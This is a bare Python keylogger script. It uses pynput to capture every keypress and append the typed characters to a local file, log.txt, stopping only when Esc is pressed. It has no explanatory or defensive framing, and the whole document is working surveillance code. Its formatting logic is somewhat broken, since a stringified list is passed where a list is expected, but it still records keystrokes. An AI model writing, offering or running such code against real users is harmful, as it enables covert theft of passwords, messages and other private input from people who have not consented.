import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
        global keys, count


        keys.append(key)
        count += 1
        # print("{0} pressed".format(key))

        if count > 0:
                count = 0
                write(str(keys))
                keys = []

def on_release(key):
        if key == Key.esc:
                return False

def write(keys):
        with open("log.txt", "a") as f:
                for key in keys: 
                        k = str(key).replace("'","")
                        k = k.replace("[","")
                        k = k.replace("]","") 
                                
                        if k.find("space") > 0: 
                                f.write('\n')

                        elif k.find("Key") == -1:                   
                                f.write(k)
                  
with Listener(on_press=on_press, on_release=on_release) as Listener:
        Listener.join()   